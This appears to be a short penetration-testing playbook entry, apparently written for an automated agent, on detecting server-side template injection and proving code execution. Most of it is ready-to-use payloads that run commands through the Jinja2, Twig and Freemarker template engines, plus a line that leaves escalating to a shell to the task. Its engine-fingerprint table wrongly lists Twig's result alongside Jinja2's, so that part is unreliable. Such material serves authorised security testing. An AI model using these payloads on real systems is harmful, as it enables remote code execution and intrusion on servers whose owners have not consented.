---
id: ssti-basic
title: SSTI — template-engine detection to id-proof
triggers: [{{, }}, ${, #{, ssti, jinja, twig, freemarker]
---

## Detection — the math probe, zero damage

- Inject `{{7*7}}`, `${7*7}`, `#{7*7}`, `<%= 7*7 %>` into the parameter —
  `49` in the response = the engine evaluated you (literal `{{7*7}}` back
  = no injection).
- Engine fingerprint (guesses -> engine):
  `{{7*'7'}}` → `7777777` = Jinja2/Twig, `49` = Smarty/other.
  `${7*7}` → `49` = Freemarker/EL. `#{7*7}` → `49` = Ruby ERB/Pug-ish.

## Proof-of-RCE (the finding's evidence)

```text
Jinja2/py:   {{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}
             {{ ''.__class__.mro()[1].__subclasses__() }} → find popen
Twig/php:    {{_self.env.registerUndefinedFilterCallback("system")}}{{_self.env.getFilter("id")}}
Freemarker:  <#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}
```

- `uid=`/`gid=` output IS the confirmed-finding evidence — record it,
  don't escalate to a shell unless the task needs it.
- SSTI in error pages (reflected 404 template) counts — same severity
  rules as reflected RCE sinks.
